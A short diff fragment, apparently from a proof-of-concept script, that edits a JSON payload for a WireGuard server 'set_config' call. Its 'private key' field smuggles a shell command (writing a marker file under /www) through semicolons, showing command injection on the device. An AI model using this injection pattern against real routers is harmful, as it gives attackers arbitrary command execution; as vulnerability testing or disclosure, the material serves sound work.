@@ -40,7 +40,7 @@ data = {
         "wg-server",
         "set_config",
         {
-            "address v4":"192.168.1.0/24"
+            "address_v4":"192.168.1.0/24",
             "port":51820,
             "private key":"cEJncVlTcEIncVlTcEJncVlTcEIncVlTcEIncVlTcFI=;echo 1234>/www/pwntest1.txt;echo cFincVlTcFincVlTcFIncVlTcFJncVlTcEJncVLTCEI=;#"
         }
